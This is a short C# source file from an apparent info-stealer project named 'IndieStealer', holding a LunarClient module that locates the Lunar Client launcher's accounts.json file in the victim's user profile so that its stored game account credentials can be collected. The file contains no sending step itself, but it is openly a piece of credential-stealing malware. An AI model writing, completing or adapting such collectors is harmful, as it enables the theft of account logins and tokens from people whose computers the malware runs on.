using System.IO;

namespace IndieStealer.Collect.Games
{
    class LunarClient
    {
        public static string lunarFile { get; set; } = "";

        public static void Collect()
        {
            try
            {
                if (!File.Exists(Info.Profile + "\\.lunarclient\\settings\\game\\accounts.json"))
                    return;
                lunarFile = Info.Profile + "\\.lunarclient\\settings\\game\\accounts.json";
            }
            catch
            { }
            
        }
    }
}
